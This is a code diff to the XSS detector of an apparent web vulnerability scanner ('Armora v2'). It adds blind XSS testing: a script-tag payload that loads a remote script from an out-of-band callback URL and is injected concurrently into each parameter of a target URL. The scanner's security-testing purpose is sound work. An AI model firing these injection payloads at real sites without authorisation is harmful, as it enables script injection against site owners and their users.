@@ -1,28 +1,19 @@
-"""
-XSS Detector — Armora v2.
-
-Exploit-verification-first:
-1. Baseline request.
-2. Inject XSS payloads into each parameter — concurrently.
-3. Check if payload / canary is reflected in the response body.
-4. Score with the simple confidence model.
-"""
-
 import logging
+import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from ..payloads.xss_payloads import XSS_PAYLOADS, XSS_CONFIRMATION_SIGNATURES, XSS_CANARY
 from ..utils.http_client import HttpClient
 from ..utils.response_analyzer import ResponseAnalyzer
 from ..utils.confidence import calculate_confidence, classify_confidence
+from ..intelligence.oob_manager import oob
 
 logger = logging.getLogger(__name__)
 
 _MAX_WORKERS = 20
 
-
 class XSSDetector:
-    """Independent Reflected XSS detector — no ML, no Gemini."""
+    """XSS detector with Blind XSS (OOB) support."""
 
     vuln_type = "Cross-Site Scripting (XSS)"
 
@@ -30,58 +21,70 @@ class XSSDetector:
         self.http = HttpClient(session=session)
         self.analyzer = ResponseAnalyzer()
 
-    def detect(self, url: str, params: dict) -> list:
-        """
-        Test every parameter in *params* for reflected XSS.
-
-        Returns:
-            List of structured finding dicts (only Confirmed / Likely).
-        """
+    def detect(self, url: str, params: dict, extra_payloads: list = None) -> list:
         findings = []
         for param, original_value in params.items():
-            result = self._test_parameter(url, params, param)
+            result = self._test_parameter(url, params, param, extra_payloads)
             if result:
                 findings.append(result)
         return findings
 
-    def _test_parameter(self, url: str, all_params: dict, param: str):
-        # 1. Baseline
+    def _test_parameter(self, url: str, all_params: dict, param: str, extra_payloads: list = None):
         baseline = self.http.get(url, params=all_params)
         if baseline["status_code"] == 0:
             return None
 
-        # 2. Fire all XSS payloads concurrently
         result_holder = []
+        
+        # 1. Blind XSS OOB Payload
+        oob_token = oob.generate_token()
+        oob_url = oob.get_http_payload(oob_token)
+        # Blind XSS payload that tries to load a remote script
+        blind_payload = f"\"><script src=\"{oob_url}\"></script>"
+        
+        payloads_to_test = list(XSS_PAYLOADS) + [blind_payload]
+        if extra_payloads:
+            payloads_to_test.extend(extra_payloads)
 
         with ThreadPoolExecutor(max_workers=_MAX_WORKERS) as executor:
             futures = {
                 executor.submit(
                     self._test_single_payload, url, all_params, param, payload, baseline
                 ): payload
-                for payload in XSS_PAYLOADS
+                for payload in payloads_to_test
             }
             for future in as_completed(futures):
                 try:
                     res = future.result()
                     if res:
                         result_holder.append(res)
-                        for f in futures:
-                            f.cancel()
                         break
                 except Exception as exc:
                     logger.warning(f"XSS payload future error: {exc}")
 
+        # 2. Final Blind XSS Check
+        if not result_holder:
+            # Blind XSS can take time to be triggered by an admin
+            # In a real scan, we'd poll this asynchronously, but here we'll 
+            # do a quick check (simulating immediate reflection in a background process)
+            if oob.check_interactions(oob_token):
+                confidence = calculate_confidence(True, True, False)
+                return {
+                    "type": self.vuln_type,
+                    "parameter": param,
+                    "confidence": confidence,
+                    "status": "Confirmed",
+                    "evidence": {
+                        "payload": blind_payload,
+                        "reflected": "Blind Callback detected",
+                        "signatures_matched": ["Blind XSS OOB Hit"],
+                        "detail": "Out-of-band script execution detected."
+                    }
+                }
+
         return result_holder[0] if result_holder else None
 
-    def _test_single_payload(
-        self,
-        url: str,
-        all_params: dict,
-        param: str,
-        payload: str,
-        baseline: dict,
-    ):
-        """Test one payload. Reuses shared session."""
+    def _test_single_payload(self, url: str, all_params: dict, param: str, payload: str, baseline: dict):
         test_params = dict(all_params)
         test_params[param] = payload
 
@@ -89,21 +92,13 @@ class XSSDetector:
         if test_resp["status_code"] == 0:
             return None
 
-        diff = self.analyzer.compare(baseline, test_resp)
         sigs = self.analyzer.find_signatures(test_resp["body"], XSS_CONFIRMATION_SIGNATURES)
         server_err = self.analyzer.is_server_error(test_resp["status_code"])
 
-        # Exploit success = payload fully reflected in response
         exploit_success = (payload.lower() in test_resp["body"].lower()) or bool(sigs)
-
-        # Strong signature = canary or event handler reflected
         strong_sig = bool(sigs)
 
-        confidence = calculate_confidence(
-            exploit_success=exploit_success,
-            strong_signature=strong_sig,
-            server_error=server_err,
-        )
+        confidence = calculate_confidence(exploit_success, strong_sig, server_err)
         status = classify_confidence(confidence)
 
         if status != "Discard":
@@ -117,8 +112,6 @@ class XSSDetector:
                     "reflected": True,
                     "signatures_matched": sigs,
                     "status_code": test_resp["status_code"],
-                    "body_hash_changed": diff["body_hash_changed"],
                 },
             }
-
         return None
